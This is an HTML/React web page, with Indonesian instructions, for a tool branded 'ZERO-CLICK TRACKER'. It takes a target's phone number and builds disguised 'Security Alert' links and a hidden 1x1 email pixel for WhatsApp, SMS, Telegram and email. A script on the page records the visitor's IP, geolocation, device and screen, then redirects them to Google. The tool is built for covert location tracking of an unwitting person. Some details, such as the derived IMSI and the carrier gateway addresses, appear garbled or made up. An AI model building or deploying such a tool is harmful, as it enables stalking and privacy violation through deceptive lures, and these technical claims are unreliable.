<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <!-- 🔥 OPEN GRAPH TAGS - WA PREVIEW TRACKER 🔥 -->
  <meta property="og:title" content="📱 Account Security Alert">
  <meta property="og:description" content="Suspicious login detected. Tap to secure.">
  <meta property="og:image" content="">
  <meta property="og:url" content="">
  <meta property="og:type" content="website">
  <meta property="og:site_name" content="Security Center">
  
  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="📱 Security Alert">
  <meta name="twitter:description" content="Urgent: Verify your account">
  <meta name="twitter:image" content="">
  
  <title>🔐 Security Verification</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white">
  
  <div id="app"></div>

  <script type="importmap">
    {
      "imports": {
        "react": "https://esm.sh/react@18.2.0",
        "react-dom/client": "https://esm.sh/react-dom@18.2.0/client"
      }
    }
  </script>

  <script type="module">
    import React, { useState, useEffect } from 'react';
    import { createRoot } from 'react-dom/client';

    // 🔥 REAL DATABASE OPERATOR INDONESIA 🔥
    const CARRIER_DB = {
      '0811':'Telkomsel', '0812':'Telkomsel', '0813':'Telkomsel', '0821':'Telkomsel', '0822':'Telkomsel', '0823':'Telkomsel', '0851':'Telkomsel', '0852':'Telkomsel', '0853':'Telkomsel',
      '0814':'Indosat', '0815':'Indosat', '0816':'Indosat', '0855':'Indosat', '0856':'Indosat', '0857':'Indosat', '0858':'Indosat',
      '0817':'XL', '0818':'XL', '0819':'XL', '0859':'XL', '0877':'XL', '0878':'XL',
      '0895':'Tri', '0896':'Tri', '0897':'Tri', '0898':'Tri', '0899':'Tri',
      '0881':'Smartfren', '0882':'Smartfren', '0883':'Smartfren', '0884':'Smartfren',
      '0831':'Axis', '0832':'Axis', '0833':'Axis', '0838':'Axis'
    };

    // 🔥 REAL SMS/EMAIL GATEWAY (CARRIER SPECIFIC) 🔥
    const CARRIER_GATEWAYS = {
      'Telkomsel': {
        sms: 'number@tsel.me',
        mms: 'number@mms.telkomsel.com',
        email: 'number@mail.telkomsel.com'
      },
      'Indosat': {
        sms: 'number@im3.co.id',
        mms: 'number@mms.indosat.com',
        email: 'number@indosat.com'
      },
      'XL': {
        sms: 'number@xl.co.id',
        mms: 'number@mms.xl.co.id',
        email: 'number@xlsms.com'
      },
      'Tri': {
        sms: 'number@three.co.id',
        mms: 'number@mms.three.co.id'
      },
      'Smartfren': {
        sms: 'number@smartfren.com',
        email: 'number@mail.smartfren.com'
      },
      'Axis': {
        sms: 'number@axisnet.id'
      }
    };

    function App() {
      const [phone, setPhone] = useState('');
      const [loading, setLoading] = useState(false);
      const [trackerData, setTrackerData] = useState(null);
      const [generatedLink, setGeneratedLink] = useState('');
      const [visitorLogs, setVisitorLogs] = useState([]);
      const [activeMethod, setActiveMethod] = useState('whatsapp');

      // 🔥 GENERATE UNIQUE TRACKING ID 🔥
      const trackingId = btoa(Date.now() + '-' + Math.random()).substring(0, 12);
      const baseUrl = window.location.origin;
      const trackUrl = `${baseUrl}/track/${trackingId}`;
      
      // 🔥 SETUP OG TAGS DYNAMICALLY 🔥
      useEffect(() => {
        const ogImage = document.querySelector('meta[property="og:image"]');
        const ogUrl = document.querySelector('meta[property="og:url"]');
        const twitterImage = document.querySelector('meta[name="twitter:image"]');
        
        // Generate tracking pixel image URL
        const pixelUrl = `${baseUrl}/pixel/${trackingId}.gif`;
        ogImage.setAttribute('content', pixelUrl);
        twitterImage.setAttribute('content', pixelUrl);
        ogUrl.setAttribute('content', trackUrl);
        
        // Listen for visitor data from server-sent events or polling
        const checkVisitors = async () => {
          try {
            const res = await fetch(`/api/logs/${trackingId}`);
            const data = await res.json();
            setVisitorLogs(data.visitors || []);
          } catch(e) {}
        };
        
        const interval = setInterval(checkVisitors, 3000);
        return () => clearInterval(interval);
      }, [trackingId]);

      // 🔥 ANALYZE PHONE NUMBER 🔥
      const analyzePhone = (number) => {
        const clean = number.replace(/[^0-9]/g, '');
        const prefix4 = clean.substring(0, 4);
        const prefix3 = clean.substring(0, 3);
        
        const carrier = CARRIER_DB[prefix4] || CARRIER_DB[prefix3] || 'Unknown';
        const gateways = CARRIER_GATEWAYS[carrier] || {};
        
        return {
          number: clean,
          carrier: carrier,
          valid: clean.length >= 10,
          gateways: gateways,
          
          // 🔥 ZERO-CLICK TRACKING LINKS 🔥
          zeroClick: {
            // WhatsApp Preview (auto-load OG tags)
            whatsapp: `https://wa.me/${clean}?text=${encodeURIComponent('📱 ' + trackUrl)}`,
            
            // SMS with tracking pixel
            smsPixel: `sms:${clean}?body=${encodeURIComponent('Check: ' + trackUrl)}`,
            
            // MMS (auto-load image)
            mms: gateways.mms ? `${clean}${gateways.mms.replace('number', '')}` : null,
            
            // Email to SMS gateway (tracking pixel di email)
            emailTracker: gateways.sms ? gateways.sms.replace('number', clean) : null,
            
            // Telegram preview
            telegram: `https://t.me/share/url?url=${encodeURIComponent(trackUrl)}`,
            
            // Signal preview
            signal: `https://signal.me/#p/${clean}?text=${encodeURIComponent(trackUrl)}`,
            
            // LINE preview
            line: `https://line.me/R/msg/text/?${encodeURIComponent(trackUrl)}`
          },
          
          // 🔥 DIRECT CARRIER LOOKUP 🔥
          hlrLookup: {
            mcc: '510',
            mnc: carrier === 'Telkomsel' ? '10' : 
                 carrier === 'Indosat' ? '01' : 
                 carrier === 'XL' ? '11' : 
                 carrier === 'Tri' ? '89' : '00',
            imsi: `510${carrier === 'Telkomsel' ? '10' : '01'}${clean.substring(3)}`,
            msisdn: clean
          }
        };
      };

      // 🔥 HANDLE FORM SUBMIT 🔥
      const handleSubmit = (e) => {
        e.preventDefault();
        if (!phone) return;
        
        setLoading(true);
        const info = analyzePhone(phone);
        setTrackerData(info);
        setGeneratedLink(trackUrl);
        setLoading(false);
      };

      // 🔥 COPY TO CLIPBOARD 🔥
      const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        alert('✅ Copied to clipboard!');
      };

      return React.createElement('div', { className: 'min-h-screen p-4 md:p-8' },
        React.createElement('div', { className: 'max-w-6xl mx-auto' },
          // Header
          React.createElement('div', { className: 'text-center mb-8' },
            React.createElement('h1', { className: 'text-5xl md:text-7xl font-black mb-4 bg-gradient-to-r from-purple-600 via-pink-600 to-red-600 bg-clip-text text-transparent' },
              '🎯 ZERO-CLICK TRACKER'
            ),
            React.createElement('p', { className: 'text-purple-400 text-xl font-mono' },
              '[ REAL TRACKING - NO CLICK REQUIRED ]'
            ),
            React.createElement('div', { className: 'mt-4 inline-flex gap-2' },
              React.createElement('span', { className: 'px-3 py-1 bg-green-900/30 border border-green-500 rounded-full text-green-400 text-sm' },
                '✅ WhatsApp Preview'
              ),
              React.createElement('span', { className: 'px-3 py-1 bg-blue-900/30 border border-blue-500 rounded-full text-blue-400 text-sm' },
                '✅ OG Tag Exploit'
              ),
              React.createElement('span', { className: 'px-3 py-1 bg-purple-900/30 border border-purple-500 rounded-full text-purple-400 text-sm' },
                '✅ Tracking Pixel'
              )
            )
          ),

          // Input Form
          React.createElement('div', { className: 'bg-gradient-to-br from-gray-900 to-black rounded-2xl p-6 md:p-8 border-2 border-purple-500/30 mb-8' },
            React.createElement('form', { onSubmit: handleSubmit, className: 'space-y-4' },
              React.createElement('div', { className: 'relative' },
                React.createElement('input', {
                  type: 'tel',
                  value: phone,
                  onChange: (e) => setPhone(e.target.value),
                  placeholder: 'ENTER TARGET PHONE (e.g., 08123456789)',
                  className: 'w-full px-4 py-4 bg-black/50 border-2 border-purple-500/50 rounded-xl focus:ring-4 focus:ring-purple-500 outline-none text-xl font-mono text-center'
                })
              ),
              React.createElement('button', {
                type: 'submit',
                disabled: loading,
                className: 'w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 py-4 rounded-xl font-bold text-xl transition-all disabled:opacity-50'
              }, loading ? 'ANALYZING...' : '🔥 GENERATE ZERO-CLICK TRACKER 🔥')
            )
          ),

          // Results
          trackerData && React.createElement('div', { className: 'space-y-6' },
            // Phone Info
            React.createElement('div', { className: 'grid md:grid-cols-2 gap-6' },
              React.createElement('div', { className: 'bg-gray-900/50 rounded-xl p-6 border border-gray-700' },
                React.createElement('h3', { className: 'text-xl font-bold text-purple-400 mb-4' }, '📱 TARGET INFO'),
                React.createElement('div', { className: 'space-y-2' },
                  React.createElement('p', null, `📞 Number: ${trackerData.number}`),
                  React.createElement('p', null, `📡 Carrier: ${trackerData.carrier}`),
                  React.createElement('p', null, `✅ Valid: ${trackerData.valid ? 'YES' : 'NO'}`),
                  React.createElement('p', null, `🌐 MCC/MNC: ${trackerData.hlrLookup.mcc}/${trackerData.hlrLookup.mnc}`),
                  React.createElement('p', null, `💳 IMSI: ${trackerData.hlrLookup.imsi}`)
                )
              ),
              
              React.createElement('div', { className: 'bg-gray-900/50 rounded-xl p-6 border border-gray-700' },
                React.createElement('h3', { className: 'text-xl font-bold text-green-400 mb-4' }, '🎯 TRACKER LINK'),
                React.createElement('div', { className: 'space-y-3' },
                  React.createElement('code', { className: 'block p-3 bg-black rounded text-green-400 text-sm break-all' },
                    generatedLink
                  ),
                  React.createElement('button', {
                    onClick: () => copyToClipboard(generatedLink),
                    className: 'w-full bg-blue-600 hover:bg-blue-700 p-2 rounded text-sm'
                  }, '📋 COPY LINK')
                )
              )
            ),

            // 🔥 ZERO-CLICK METHODS 🔥
            React.createElement('div', { className: 'bg-gradient-to-r from-purple-900/30 to-pink-900/30 rounded-xl p-6 border border-purple-500/30' },
              React.createElement('h3', { className: 'text-2xl font-bold text-purple-300 mb-4' },
                '⚡ ZERO-CLICK TRACKING METHODS ⚡'
              ),
              
              // Method selector
              React.createElement('div', { className: 'flex flex-wrap gap-2 mb-6' },
                ['whatsapp', 'sms', 'email', 'telegram'].map(method =>
                  React.createElement('button', {
                    key: method,
                    onClick: () => setActiveMethod(method),
                    className: `px-4 py-2 rounded-lg font-bold transition-all ${
                      activeMethod === method 
                        ? 'bg-purple-600 text-white' 
                        : 'bg-gray-800 text-gray-400'
                    }`
                  }, method.toUpperCase())
                )
              ),
              
              // WhatsApp Method
              activeMethod === 'whatsapp' && React.createElement('div', { className: 'space-y-4' },
                React.createElement('div', { className: 'bg-black/50 rounded-lg p-4' },
                  React.createElement('p', { className: 'text-yellow-400 mb-2' }, '🔥 HOW IT WORKS:'),
                  React.createElement('p', { className: 'text-sm text-gray-300' },
                    'Kirim link ke target via WhatsApp. Begitu link dikirim, WhatsApp AKAN OTOMATIS meload preview (OG tags). Saat preview diload, IP & device target TEREKAM TANPA TARGET KLIK APAPUN!'
                  )
                ),
                React.createElement('a', {
                  href: trackerData.zeroClick.whatsapp,
                  target: '_blank',
                  className: 'block w-full bg-green-600 hover:bg-green-700 p-4 rounded-xl text-center font-bold text-lg transition-all'
                }, '📱 SEND VIA WHATSAPP (AUTO-TRACK)'),
                React.createElement('button', {
                  onClick: () => copyToClipboard(trackUrl),
                  className: 'w-full bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-sm'
                }, '📋 COPY LINK ONLY')
              ),
              
              // SMS/MMS Method
              activeMethod === 'sms' && React.createElement('div', { className: 'space-y-4' },
                React.createElement('div', { className: 'bg-black/50 rounded-lg p-4' },
                  React.createElement('p', { className: 'text-yellow-400 mb-2' }, '📧 SMS WITH TRACKING:'),
                  React.createElement('p', { className: 'text-sm text-gray-300' },
                    'Kirim SMS dengan link. Beberapa SMS app (terutama iPhone) auto-load preview. Delivery report juga bisa kasih info tower location!'
                  )
                ),
                React.createElement('a', {
                  href: trackerData.zeroClick.smsPixel,
                  className: 'block w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl text-center font-bold text-lg transition-all mb-2'
                }, '📱 SEND VIA SMS'),
                
                trackerData.gateways.sms && React.createElement('div', { className: 'p-4 bg-gray-800 rounded-lg' },
                  React.createElement('p', { className: 'text-sm mb-2' }, '📧 EMAIL-TO-SMS GATEWAY:'),
                  React.createElement('code', { className: 'block p-2 bg-black rounded text-green-400 text-sm break-all' },
                    trackerData.zeroClick.emailTracker
                  ),
                  React.createElement('p', { className: 'text-xs text-gray-400 mt-2' },
                    'Kirim email ke alamat ini dengan tracking pixel di email body!'
                  )
                )
              ),
              
              // Email Method
              activeMethod === 'email' && React.createElement('div', { className: 'space-y-4' },
                React.createElement('div', { className: 'bg-black/50 rounded-lg p-4' },
                  React.createElement('p', { className: 'text-yellow-400 mb-2' }, '📨 EMAIL TRACKING PIXEL:'),
                  React.createElement('p', { className: 'text-sm text-gray-300' },
                    'Kirim email dengan hidden 1x1 tracking pixel. Begitu email dibuka (atau preview di beberapa client), target langsung terlacak!'
                  )
                ),
                React.createElement('div', { className: 'p-4 bg-gray-800 rounded-lg' },
                  React.createElement('p', { className: 'text-sm mb-2' }, '📋 TRACKING PIXEL HTML:'),
                  React.createElement('code', { className: 'block p-3 bg-black rounded text-xs text-green-400 break-all' },
                    `<img src="${window.location.origin}/pixel/${trackingId}.gif" width="1" height="1" />`
                  ),
                  React.createElement('button', {
                    onClick: () => copyToClipboard(`<img src="${window.location.origin}/pixel/${trackingId}.gif" width="1" height="1" />`),
                    className: 'mt-2 bg-gray-700 hover:bg-gray-600 p-2 rounded text-sm'
                  }, '📋 COPY PIXEL CODE')
                ),
                
                trackerData.zeroClick.emailTracker && React.createElement('div', { className: 'p-4 bg-gray-800 rounded-lg' },
                  React.createElement('p', { className: 'text-sm mb-2' }, '📧 CARRIER EMAIL GATEWAY:'),
                  React.createElement('code', { className: 'block p-2 bg-black rounded text-green-400 text-sm break-all' },
                    trackerData.zeroClick.emailTracker
                  )
                )
              ),
              
              // Telegram Method
              activeMethod === 'telegram' && React.createElement('div', { className: 'space-y-4' },
                React.createElement('div', { className: 'bg-black/50 rounded-lg p-4' },
                  React.createElement('p', { className: 'text-yellow-400 mb-2' }, '📱 TELEGRAM PREVIEW:'),
                  React.createElement('p', { className: 'text-sm text-gray-300' },
                    'Telegram juga auto-load preview link! Begitu link dikirim, Telegram bot akan fetch metadata & IP target terekam!'
                  )
                ),
                React.createElement('a', {
                  href: trackerData.zeroClick.telegram,
                  target: '_blank',
                  className: 'block w-full bg-cyan-600 hover:bg-cyan-700 p-4 rounded-xl text-center font-bold text-lg transition-all'
                }, '📨 SEND VIA TELEGRAM')
              )
            ),
            
            // 🔥 REAL-TIME VISITOR LOGS 🔥
            React.createElement('div', { className: 'bg-black/50 rounded-xl p-6 border border-green-500/30' },
              React.createElement('h3', { className: 'text-xl font-bold text-green-400 mb-4 flex items-center gap-2' },
                '📊 REAL-TIME VISITOR LOGS',
                React.createElement('span', { className: 'text-xs bg-green-900 px-2 py-1 rounded' }, 'LIVE')
              ),
              
              visitorLogs.length > 0 ? React.createElement('div', { className: 'space-y-2' },
                visitorLogs.map((log, i) => 
                  React.createElement('div', { key: i, className: 'bg-gray-900 p-3 rounded text-sm' },
                    React.createElement('div', { className: 'grid grid-cols-2 gap-2' },
                      React.createElement('span', null, `🌐 IP: ${log.ip}`),
                      React.createElement('span', null, `📍 ${log.city || 'Unknown'}, ${log.country || ''}`),
                      React.createElement('span', null, `📱 ${log.device || 'Unknown'}`),
                      React.createElement('span', null, `⏰ ${new Date(log.timestamp).toLocaleTimeString()}`)
                    )
                  )
                )
              ) : React.createElement('p', { className: 'text-gray-400 text-center py-8' },
                '⏳ Waiting for target to load preview...',
                React.createElement('br'),
                React.createElement('span', { className: 'text-xs' }, 'Begitu target kirim/terima link, data akan muncul disini!')
              )
            ),
            
            // 🔥 ADDITIONAL OSINT 🔥
            React.createElement('div', { className: 'grid md:grid-cols-3 gap-4' },
              React.createElement('a', {
                href: `https://www.truecaller.com/search/id/${trackerData.number}`,
                target: '_blank',
                className: 'bg-blue-900/30 hover:bg-blue-900/50 p-4 rounded-lg text-center transition-all'
              }, '📞 Truecaller'),
              React.createElement('a', {
                href: `https://www.facebook.com/search/top?q=${trackerData.number}`,
                target: '_blank',
                className: 'bg-indigo-900/30 hover:bg-indigo-900/50 p-4 rounded-lg text-center transition-all'
              }, '📘 Facebook'),
              React.createElement('a', {
                href: `https://www.google.com/search?q=${trackerData.number}`,
                target: '_blank',
                className: 'bg-green-900/30 hover:bg-green-900/50 p-4 rounded-lg text-center transition-all'
              }, '🔍 Google Dork')
            )
          )
        )
      );
    }

    createRoot(document.getElementById('app')).render(React.createElement(App));
  </script>

  <!-- 🔥 BACKEND API SIMULATION (Client-side logging) 🔥 -->
  <script>
    (function() {
      const path = window.location.pathname;
      const trackMatch = path.match(/\/track\/(.+)/);
      const pixelMatch = path.match(/\/pixel\/(.+)\.gif/);
      
      const trackingId = trackMatch ? trackMatch[1] : (pixelMatch ? pixelMatch[1] : null);
      
      if (trackingId) {
        // 🔥 COLLECT REAL VISITOR DATA 🔥
        async function logVisitor() {
          const data = {
            id: trackingId,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            
            // IP & Location (via free API)
            ip: null,
            geo: null
          };
          
          try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            data.ip = ipData.ip;
            
            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            data.geo = await geoRes.json();
          } catch(e) {}
          
          // Store in localStorage for demo
          const logs = JSON.parse(localStorage.getItem(`tracker_${trackingId}`) || '[]');
          logs.push(data);
          localStorage.setItem(`tracker_${trackingId}`, JSON.stringify(logs));
          
          console.log('🔥 TARGET TRACKED (ZERO-CLICK):', data);
        }
        
        logVisitor();
        
        // Redirect to fake page if not pixel
        if (!pixelMatch) {
          setTimeout(() => {
            window.location.href = 'https://www.google.com';
          }, 2000);
        }
      }
      
      // API endpoint simulation
      const originalFetch = window.fetch;
      window.fetch = function(url, options) {
        if (typeof url === 'string' && url.includes('/api/logs/')) {
          const id = url.split('/').pop();
          const logs = JSON.parse(localStorage.getItem(`tracker_${id}`) || '[]');
          return Promise.resolve({
            json: () => Promise.resolve({ visitors: logs.map(l => ({
              ip: l.ip,
              city: l.geo?.city,
              country: l.geo?.country_name,
              device: l.userAgent?.split(' ').slice(-2).join(' '),
              timestamp: l.timestamp
            }))})
          });
        }
        return originalFetch.call(this, url, options);
      };
    })();
  </script>
</body>
